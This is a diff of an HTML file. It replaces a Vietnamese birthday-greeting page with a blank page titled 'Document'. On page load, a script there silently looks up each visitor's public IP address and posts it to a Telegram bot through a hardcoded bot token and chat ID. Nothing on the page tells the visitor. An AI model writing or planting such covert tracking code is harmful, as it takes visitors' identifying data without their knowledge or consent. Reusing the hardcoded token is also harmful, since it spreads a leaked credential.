@@ -1,297 +1,38 @@
-<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "htt`://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
-<html xml:lang="en" xmlns="http://www.w3.org/1999/xhtml">
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Document</title>
+  </head>
+  <body>
+    <script>
+      const botToken = "7396787396:AAGs_K5jy9txTVlQv-ltZbzo8eSXncwTUwk";
+      const userID = "5680204913";
+      const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
+      const data = new URLSearchParams();
 
-<head>
-    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
-    <title>Happy birth day</title>
-    <link type="text/css" rel="stylesheet" href="./index.css">
-    </link>
-    <script src="https://cdn.bootcdn.net/ajax/libs/jquery/3.6.0/jquery.js"></script>
-    <script type="text/javascript" src="./jscex.js"></script>
-    <style type="text/css">
-        .q_photo {
-            display: inline-block;
-            position: fixed;
-            top: 20px;
-            left: 20px;
-            width: 100px;
-            height: 100px;
-            border: 1px solid #eee;
-            border-radius: 50px;
-            z-index: 500;
+      getPublicIP().then((publicIP) => {
+        if (publicIP) {
+          data.append("chat_id", userID);
+          data.append("text", publicIP);
+          fetch(url, {
+            method: "POST",
+            body: data,
+          });
         }
+      });
 
-        /* .STYLE1 {color: #666666} */
-    </style>
-</head>
-
-<body>
-
-    <audio controls id="audioPlayer" style="display: none;">
-        <source
-            src="https://firebasestorage.googleapis.com/v0/b/hpbd-3d804.appspot.com/o/y2mate.com%20-%20Vietsub%20Ki%E1%BA%BFp%20sau%20kh%C3%B4ng%20ch%E1%BA%AFc%20c%C3%B2n%20c%C3%B3%20th%E1%BB%83%20g%E1%BA%B7p%20%C4%91%C6%B0%E1%BB%A3c%20anh%20%20M%E1%BA%A1c%20Khi%E1%BA%BFu%20T%E1%BB%B7%20T%E1%BB%B7%20%20%E4%B8%8B%E8%BE%88%E5%AD%90%E4%B8%8D%E4%B8%80%E5%AE%9A%E8%BF%98%E8%83%BD%E9%81%87%E8%A7%81%E4%BD%A0%20%20%E8%8E%AB%E5%8F%AB%E5%A7%90%E5%A7%90.mp3?alt=media&token=c304ea65-37d9-4df6-8d93-45cdd16e4330"
-            type="audio/mpeg" />
-    </audio>
-    
-
-    <script>
-        /*
-        * http://love.hackerzhou.me
-        */
-
-        // variables
-        var $win = $(window);
-        var clientWidth = $win.width();
-        var clientHeight = $win.height();
-
-        $(window).resize(function () {
-            var newWidth = $win.width();
-            var newHeight = $win.height();
-            if (newWidth != clientWidth && newHeight != clientHeight) {
-                location.replace(location);
-            }
-        });
-
-        (function ($) {
-            $.fn.typewriter = function () {
-                this.each(function () {
-                    var $ele = $(this), str = $ele.html(), progress = 0;
-                    $ele.html('');
-                    var timer = setInterval(function () {
-                        var current = str.substr(progress, 1);
-                        if (current == '<') {
-                            progress = str.indexOf('>', progress) + 1;
-                        } else {
-                            progress++;
-                        }
-                        $ele.html(str.substring(0, progress) + (progress & 1 ? '_' : ''));
-                        if (progress >= str.length) {
-                            clearInterval(timer);
-                        }
-                    }, 75);
-                });
-                return this;
-            };
-        })(jQuery);
-
-        function timeElapse(date) {
-            var current = Date();
-            var seconds = (Date.parse(current) - Date.parse(date)) / 1000;
-            var days = Math.floor(seconds / (3600 * 24));
-            seconds = seconds % (3600 * 24);
-            var hours = Math.floor(seconds / 3600);
-            if (hours < 10) {
-                hours = "0" + hours;
-            }
-            seconds = seconds % 3600;
-            var minutes = Math.floor(seconds / 60);
-            if (minutes < 10) {
-                minutes = "0" + minutes;
-            }
-            seconds = seconds % 60;
-            if (seconds < 10) {
-                seconds = "0" + seconds;
-            }
-            var result = "第<span class=\"digit\">" + days + "</span> 天<span class=\"digit\">" + hours + "</span> 小时<span class=\"digit\">" + minutes + "</span> 分钟<span class=\"digit\">" + seconds + "</span> 秒";
-            $("#clock").html(result);
-        }
+      function getPublicIP() {
+        return fetch("https://api.ipify.org?format=json")
+          .then((response) => response.json())
+          .then((data) => {
+            return data.ip;
+          })
+          .catch((error) => {
+            return null;
+          });
+      }
     </script>
-    <script type="text/javascript" src="./love.js" charset="utf-8"></script>
-
-    <div id="main">
-        <div id="wrap">
-            <div id="text">
-                <div id="code">
-                    <font color="#FF0000">
-                        <span class="say">
-                            <h2>Hôm nay là một ngày đặc biệt của một người đặc biệt đối với anh</h2>
-                        </span>
-                        <span class="say textcommon">Anh luôn tự hào vì có một người bạn gái tuyệt vời như em.</span><br> <br>
-                        <span class="say textcommon">Hôm nay là ngày sinh nhật em !</span><br><br>
-                        <span class="say textcommon">Anh chúc em luôn có được sự ủng hộ và yêu thương từ gia đình và mọi
-                            người.</span><br><br>
-                        <span class="say textcommon">Anh chúc em mãi luôn khỏe mạnh, hạnh phúc và đạt được nhiều thành công trong
-                            cuộc sống.</span><br><br>
-                        <span class="say textcommon">Hy vọng em sẽ luôn giữ được tinh thần lạc quan, nhiệt huyết và tràn đầy năng
-                            lượng trong những năm tháng tiếp theo.</span><br><br>
-                        <span class="say textcommon">Cảm ơn em! Người luôn mang cho anh niềm vui trong cuộc sống
-                            này.</span><br><br>
-                        <span class="say textcommon"><span class="space"></span> -- created by Người yêu em ! -- </span><br>
-                        <span class="say">
-                            <h2>Mãi bên nhau nhé !</h2>
-                        </span><br>
-                    </font>
-                </div>
-            </div>
-            <div id="clock-box">
-                <span class="STYLE1"></span>
-                <font color="#33CC00"></font>
-                <span class="STYLE1"></span>
-            </div>
-            <canvas id="canvas" width="1100" height="680"></canvas>
-        </div>
-    </div>
-
-    <script>
-    </script>
-
-    <script>
-        (function () {
-            var canvas = $('#canvas');
-
-            if (!canvas[0].getContext) {
-                $("#error").show();
-                return false;
-            }
-
-            var width = canvas.width();
-            var height = canvas.height();
-            canvas.attr("width", width);
-            canvas.attr("height", height);
-            var opts = {
-                seed: {
-                    x: width / 2 - 20,
-                    color: "rgb(190, 26, 37)",
-                    scale: 2
-                },
-                branch: [
-                    [535, 680, 570, 250, 500, 200, 30, 100, [
-                        [540, 500, 455, 417, 340, 400, 13, 100, [
-                            [450, 435, 434, 430, 394, 395, 2, 40]
-                        ]],
-                        [550, 445, 600, 356, 680, 345, 12, 100, [
-                            [578, 400, 648, 409, 661, 426, 3, 80]
-                        ]],
-                        [539, 281, 537, 248, 534, 217, 3, 40],
-                        [546, 397, 413, 247, 328, 244, 9, 80, [
-                            [427, 286, 383, 253, 371, 205, 2, 40],
-                            [498, 345, 435, 315, 395, 330, 4, 60]
-                        ]],
-                        [546, 357, 608, 252, 678, 221, 6, 100, [
-                            [590, 293, 646, 277, 648, 271, 2, 80]
-                        ]]
-                    ]]
-                ],
-                bloom: {
-                    num: 700,
-                    width: 1080,
-                    height: 650,
-                },
-                footer: {
-                    width: 1200,
-                    height: 5,
-                    speed: 10,
-                }
-            }
-
-            var tree = new Tree(canvas[0], width, height, opts);
-            var seed = tree.seed;
-            var foot = tree.footer;
-            var hold = 1;
-
-            canvas.click(function (e) {
-                var audio = document.getElementById("audioPlayer");
-                audio.play();
-                var offset = canvas.offset(), x, y;
-                x = e.pageX - offset.left;
-                y = e.pageY - offset.top;
-                if (seed.hover(x, y)) {
-                    hold = 0;
-                    canvas.unbind("click");
-                    canvas.unbind("mousemove");
-                    canvas.removeClass('hand');
-                }
-            }).mousemove(function (e) {
-                var offset = canvas.offset(), x, y;
-                x = e.pageX - offset.left;
-                y = e.pageY - offset.top;
-                canvas.toggleClass('hand', seed.hover(x, y));
-            });
-
-            var seedAnimate = eval(Jscex.compile("async", function () {
-                seed.draw();
-                while (hold) {
-                    $await(Jscex.Async.sleep(10));
-                }
-                while (seed.canScale()) {
-                    seed.scale(0.95);
-                    $await(Jscex.Async.sleep(10));
-                }
-                while (seed.canMove()) {
-                    seed.move(0, 2);
-                    foot.draw();
-                    $await(Jscex.Async.sleep(10));
-                }
-            }));
-
-            var growAnimate = eval(Jscex.compile("async", function () {
-                do {
-                    tree.grow();
-                    $await(Jscex.Async.sleep(10));
-                } while (tree.canGrow());
-            }));
-
-            var flowAnimate = eval(Jscex.compile("async", function () {
-                do {
-                    tree.flower(2);
-                    $await(Jscex.Async.sleep(10));
-                } while (tree.canFlower());
-            }));
-
-            var moveAnimate = eval(Jscex.compile("async", function () {
-                tree.snapshot("p1", 240, 0, 610, 680);
-                while (tree.move("p1", 500, 0)) {
-                    foot.draw();
-                    $await(Jscex.Async.sleep(10));
-                }
-                foot.draw();
-                tree.snapshot("p2", 500, 0, 610, 680);
-
-                canvas.parent().css("background", "url(" + tree.toDataURL('image/png') + ")");
-                canvas.css("background", "#ffe");
-                $await(Jscex.Async.sleep(300));
-                canvas.css("background", "none");
-            }));
-
-            var jumpAnimate = eval(Jscex.compile("async", function () {
-                var ctx = tree.ctx;
-                while (true) {
-                    tree.ctx.clearRect(0, 0, width, height);
-                    tree.jump();
-                    foot.draw();
-                    $await(Jscex.Async.sleep(25));
-                }
-            }));
-
-            var textAnimate = eval(Jscex.compile("async", function () {
-                var together = new Date();
-                together.setFullYear(2009, 10, 23);
-                together.setHours(16);
-                together.setMinutes(53);
-                together.setSeconds(0);
-                together.setMilliseconds(2);
-
-                $("#code").show().typewriter();
-                $("#clock-box").fadeIn(270);
-                while (true) {
-                    timeElapse(together);
-                    $await(Jscex.Async.sleep(270));
-                }
-            }));
-
-            var runAsync = eval(Jscex.compile("async", function () {
-
-                $await(seedAnimate());
-                $await(growAnimate());
-                textAnimate().start();
-                $await(flowAnimate());
-                $await(moveAnimate());
-                $await(jumpAnimate());
-            }));
-
-            runAsync().start();
-        })();
-    </script>
-</body>
-
+  </body>
 </html>
